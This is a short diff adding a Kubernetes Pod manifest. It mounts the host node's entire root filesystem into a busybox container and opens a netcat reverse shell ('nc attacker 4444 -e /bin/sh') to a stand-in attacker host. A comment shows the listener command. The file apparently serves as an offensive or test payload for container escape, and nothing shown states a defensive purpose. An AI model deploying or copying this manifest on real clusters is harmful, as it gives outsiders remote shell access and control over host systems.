@@ -1,0 +1,20 @@
+# nc -lvp 4444
+apiVersion: v1
+kind: Pod
+metadata:
+  name: hostmount-container
+  namespace: security
+spec:
+  containers:
+  - name: busybox
+    image: busybox
+    command: ["/bin/sh"]
+    args: ["-c", "nc attacker 4444 -e /bin/sh"]
+    volumeMounts:
+    - name: host
+      mountPath: /mnt_path
+  volumes:
+  - name: host
+    hostPath:
+      path: /
+      type: Directory
